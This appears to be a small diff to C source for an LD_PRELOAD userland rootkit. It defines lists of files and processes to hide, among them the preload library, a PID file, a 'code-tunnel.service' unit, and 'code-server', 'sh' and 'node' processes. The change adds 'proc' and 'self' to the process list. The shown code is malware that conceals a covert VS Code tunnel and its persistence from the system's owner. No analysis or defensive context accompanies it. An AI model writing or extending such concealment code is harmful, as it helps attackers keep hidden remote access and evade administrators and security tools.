@@ -9,7 +9,7 @@
 #include <sys/stat.h>
 
 static const char *HIDE_FILES[] = {"vscode", ".vscode", "ld_preload.so", "pid.txt", "proc", "self", "code-tunnel.service"};
-static const char *HIDE_PROCS[] = {"code", "vscode", "code-server", "sh", "node"};
+static const char *HIDE_PROCS[] = {"code", "vscode", "proc", "self", "code-server", "sh", "node"};
 
 static int should_hide(const char *name, const char **list, size_t count) {
     if (!name) return 0;
